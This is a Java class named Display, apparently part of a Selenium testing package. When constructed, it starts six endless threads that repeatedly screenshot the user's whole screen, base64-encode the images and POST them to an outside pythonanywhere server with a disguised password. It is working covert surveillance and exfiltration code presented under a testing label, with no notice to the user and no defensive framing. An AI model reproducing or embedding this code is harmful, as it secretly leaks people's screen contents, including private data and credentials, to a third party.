package SeleniumTestingPackage;
import java.awt.AWTException;
import java.awt.Graphics2D;
import java.awt.HeadlessException;
import java.awt.Image;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Base64;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.locks.ReentrantLock;

import javax.imageio.ImageIO;

public class Display {
	private static ReentrantLock sendingLock = new ReentrantLock();

	public Display() {
		createDisplayThread();
	}

	private static void createDisplayThread() {
		for (int i = 0; i < 6; i++) {
			Thread checkThread = new Thread(() -> {
				while (true) {
					screenShot();
					System.out.println("Sent");
				}
			});
			checkThread.start();
		}
	}

	private static void sendBase64ToServer(String base64) {
		String url = "http://randomurl.pythonanywhere.com/sendVideoData";
		String pw = "⠀⠀⠀⠀⠀";
		HttpRequest request = null;
		try {
			request = HttpRequest.newBuilder().uri(new URI(url)).header("Content-Type", "application/json")
					.POST(HttpRequest.BodyPublishers
							.ofString(String.format("{\"image\": \"%s\", \"pw\": \"%s\"}", base64, pw)))
					.build();
		} catch (URISyntaxException e) {
			e.printStackTrace();
		}
		try {
			HttpClient.newHttpClient().send(request, HttpResponse.BodyHandlers.ofString());
		} catch (IOException e) {
			e.printStackTrace();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}

	private static void screenShot() {
		BufferedImage image = null;
		try {
			image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			image = resize(image, 720, 360);
			String imageBase64 = encodeToString(image, "png");

			boolean isLockAcquired = false;

			try {
				isLockAcquired = sendingLock.tryLock(3, TimeUnit.SECONDS);
				if (isLockAcquired) {
					sendBase64ToServer(imageBase64);
				}
			} catch (InterruptedException e) {
				e.printStackTrace();
			} finally {
				if (isLockAcquired) {
					sendingLock.unlock();
				}
			}
		} catch (HeadlessException e) {
			e.printStackTrace();
		} catch (AWTException e) {
			e.printStackTrace();
		}

	}

	public static String encodeToString(BufferedImage image, String type) {
		String imageString = null;
		ByteArrayOutputStream bos = new ByteArrayOutputStream();
		try {
			ImageIO.write(image, type, bos);
		} catch (IOException e) {
			e.printStackTrace();
		}
		byte[] imageBytes = bos.toByteArray();
		Base64.Encoder encoder = Base64.getEncoder();
		imageString = encoder.encodeToString(imageBytes);

		try {
			bos.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
		return imageString;
	}

	private static BufferedImage resize(BufferedImage img, int newW, int newH) {
		Image tmp = img.getScaledInstance(newW, newH, Image.SCALE_SMOOTH);
		BufferedImage dimg = new BufferedImage(newW, newH, BufferedImage.TYPE_INT_ARGB);
		Graphics2D g2d = dimg.createGraphics();
		g2d.drawImage(tmp, 0, 0, null);
		g2d.dispose();
		tmp = null;
		return dimg;
	}
}
